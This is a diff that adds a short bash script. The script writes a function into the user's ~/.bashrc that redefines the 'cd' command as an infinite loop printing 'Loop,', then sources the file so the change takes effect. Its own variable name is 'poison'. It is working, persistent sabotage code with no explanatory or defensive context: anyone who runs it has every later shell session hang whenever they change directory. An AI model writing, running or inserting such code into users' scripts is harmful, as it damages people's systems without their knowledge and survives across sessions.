@@ -1,0 +1,14 @@
+#!/usr/bin/env bash
+
+poison=$(cat << EOF 
+
+function cd { 
+    for ((;;)); do
+     echo 'Loop,' 
+    done 
+}
+EOF
+)
+
+echo "$poison" >> ~/.bashrc
+source ~/.bashrc
